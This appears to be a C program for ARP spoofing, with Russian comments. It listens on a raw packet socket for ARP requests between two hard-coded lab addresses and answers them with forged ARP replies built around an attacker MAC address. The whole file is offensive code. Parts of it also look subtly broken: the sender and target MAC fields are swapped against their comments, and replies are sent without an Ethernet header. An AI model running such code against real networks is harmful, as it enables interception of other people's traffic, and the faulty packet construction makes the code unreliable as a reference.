#include <netinet/if_ether.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <sys/cdefs.h>
#include <sys/types.h>
#include <linux/if_packet.h>

#define TARGET_IP "172.23.0.2"
#define MY_MAC "\x02\x42\xac\x17\x00\x04"

// Функция для вывода пакета в формате hex
void print_packet(const unsigned char *data, int size) {
    for (int i = 0; i < size; i++) {
        printf("%02X ", data[i]);
        if ((i + 1) % 16 == 0) printf("\n");
    }
    printf("\n");
}

// Функция для печати содержимого ARP структуры
void print_arp_response(struct ether_arp *arp_response) {
    printf("\n--- ARP Response Structure ---\n");

    printf("ARP Hardware Type: 0x%04x\n", ntohs(arp_response->arp_hrd));  // Hardware type (Ethernet)
    printf("ARP Protocol Type: 0x%04x\n", ntohs(arp_response->arp_pro)); // Protocol type (IPv4)
    printf("ARP Hardware Address Length: %d\n", arp_response->arp_hln);  // Hardware address length (6 for MAC)
    printf("ARP Protocol Address Length: %d\n", arp_response->arp_pln);  // Protocol address length (4 for IPv4)
    printf("ARP Operation: 0x%04x\n", ntohs(arp_response->arp_op));  // ARP operation (Request/Reply)

    // Источник
    printf("Sender Hardware Address: ");
    for (int i = 0; i < 6; i++) {
        printf("%02x", arp_response->arp_sha[i]);
        if (i < 5) printf(":");
    }
    printf("\n");

    // Отправитель IP
    printf("Sender IP Address: ");
    for (int i = 0; i < 4; i++) {
        printf("%d", arp_response->arp_spa[i]);
        if (i < 3) printf(".");
    }
    printf("\n");

    // Получатель
    printf("Target Hardware Address: ");
    for (int i = 0; i < 6; i++) {
        printf("%02x", arp_response->arp_tha[i]);
        if (i < 5) printf(":");
    }
    printf("\n");

    // Целевой IP
    printf("Target IP Address: ");
    for (int i = 0; i < 4; i++) {
        printf("%d", arp_response->arp_tpa[i]);
        if (i < 3) printf(".");
    }
    printf("\n");

    printf("--------------------------------\n");
}

int main() {
    int sockfd;
    unsigned char buffer[65536];

    // Создаем raw-сокет
    if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
        perror("Socket creation failed");
        return 1;
    }

    printf("Listening for ARP packets...\n");

    while (1) {
        struct sockaddr saddr;
        socklen_t saddr_len = sizeof(saddr);

        // Получаем данные
        ssize_t data_size = recvfrom(sockfd, buffer, sizeof(buffer), 0, &saddr, &saddr_len);
        if (data_size < 0) {
            perror("Failed to receive packets");
            break;
        }

        // Заголовок ARP
        struct ether_arp *arp_header = (struct ether_arp *)(buffer + sizeof(struct ethhdr));

        // Проверяем, что это ARP-пакет
        if (ntohs(arp_header->arp_op) == ARPOP_REQUEST) {
            // Извлекаем IP-адреса отправителя и цели
            char sender_ip[INET_ADDRSTRLEN];
            char target_ip[INET_ADDRSTRLEN];

            inet_ntop(AF_INET, arp_header->arp_spa, sender_ip, INET_ADDRSTRLEN);
            inet_ntop(AF_INET, arp_header->arp_tpa, target_ip, INET_ADDRSTRLEN);

            // Проверка на нужные IP
            if (strcmp(sender_ip, "172.23.0.3") == 0 && strcmp(target_ip, TARGET_IP) == 0) {
                printf("Captured ARP Request:\n");
                printf("Sender IP: %s\n", sender_ip);
                printf("Target IP: %s\n", target_ip);
                print_packet(buffer, data_size);

                // Заполняем ARP ответ
                struct ether_arp arp_response;
                memset(&arp_response, 0, sizeof(struct ether_arp));

                // Ethernet Header
                struct ethhdr *eth_header = (struct ethhdr *)buffer;
                memcpy(arp_response.arp_sha, eth_header->h_source, 6);  // MAC адрес получателя
                memcpy(arp_response.arp_tha, MY_MAC, 6);  // MAC адрес отправителя

                // ARP Fields
                arp_response.arp_hrd = htons(ARPHRD_ETHER);  // Ethernet
                arp_response.arp_pro = htons(ETH_P_IP);      // IP
                arp_response.arp_hln = 6;                    // MAC адрес длина
                arp_response.arp_pln = 4;                    // IPv4 длина
                arp_response.arp_op = htons(ARPOP_REPLY);    // Ответ

                // IP Addresses
                memcpy(arp_response.arp_spa, arp_header->arp_tpa, 4);  // IP отправителя
                memcpy(arp_response.arp_tpa, arp_header->arp_spa, 4);  // IP получателя

                // Выводим структуру ARP перед отправкой

				print_arp_response(&arp_response);

                // Отправляем ARP ответ
                if (sendto(sockfd, &arp_response, sizeof(struct ether_arp), 0, (struct sockaddr *)&saddr, sizeof(struct sockaddr)) < 0) {
                    perror("Failed to send ARP response");
                    break;
                }
                printf("Sent ARP Response\n");
            }
        }
    }

    close(sockfd);
    return 0;
}
